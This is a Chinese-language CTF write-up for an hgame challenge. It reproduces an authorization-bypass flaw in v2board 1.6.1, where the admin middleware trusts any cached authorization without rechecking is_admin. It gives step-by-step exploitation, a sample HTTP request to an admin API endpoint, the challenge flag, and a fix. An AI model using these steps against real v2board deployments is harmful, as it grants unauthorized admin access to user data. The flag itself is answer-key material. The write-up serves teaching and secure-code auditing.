# v2board

## 题目简述

题目复现了 v2board 1.6.1 中的一处权限校验缺陷：普通用户的身份信息被写入 Redis 缓存后，管理端中间件只检查缓存键是否存在，却没有在缓存命中路径再次确认用户是否为管理员。攻击者因此可以携带普通用户的 `authorization` 直接请求后端管理接口。

目标是读取管理员用户的订阅信息，并把订阅链接中的 token 放入 `hgame{...}`。

## 解题过程

漏洞中间件的关键逻辑可简化为：

```php
$authData = explode(':', base64_decode($authorization));

if (!Cache::has($authorization)) {
    $user = User::where('password', $authData[1])
        ->where('email', $authData[0])
        ->select(['id', 'email', 'is_admin', 'is_staff'])
        ->first();

    if (!$user || !$user->is_admin) {
        abort(403, '鉴权失败');
    }

    Cache::put($authorization, $user->toArray(), 3600);
}

$request->merge([
    'user' => Cache::get($authorization),
]);
```

问题出在 `Cache::has($authorization)` 为真时：代码直接取出缓存用户并继续请求，没有检查缓存对象中的 `is_admin`。普通用户访问个人信息接口后，同一个 `authorization` 已经成为合法缓存键，随后便能触发这条错误分支。

利用步骤如下：

1. 注册并登录一个普通账号，例如 `test@abc.com`。
2. 正常访问个人信息页面或接口，使该身份对应的数据进入 Redis 缓存。
3. 从浏览器存储或网络请求中取得 `authorization` 值。
4. 不经过前端 `/admin` 路由，直接把该值放入请求头，访问后端管理接口，例如：

```http
GET /api/v1/admin/user/getUserInfoById?id=1 HTTP/1.1
Host: challenge.example
authorization: REPLACE_WITH_NORMAL_USER_AUTHORIZATION
```

接口返回管理员用户对象，其中 `token` 字段为：

```text
39d580e71705f6abac9a414def74c466
```

按照题目格式提交：

```text
hgame{39d580e71705f6abac9a414def74c466}
```

正确修复方式是在解出身份后始终校验管理员属性，而不是把“缓存命中”等同于“具备管理员权限”。历史代码和修复思路可在 [v2board 源码仓库](https://github.com/v2board/v2board) 中进一步核对。

## 方法总结

这是典型的缓存鉴权不一致：未缓存路径做了身份与角色检查，缓存命中路径却只验证“对象存在”。审计认证中间件时，应逐条比较冷缓存与热缓存路径是否执行了相同的安全判定；缓存只能优化数据读取，不能替代授权检查。
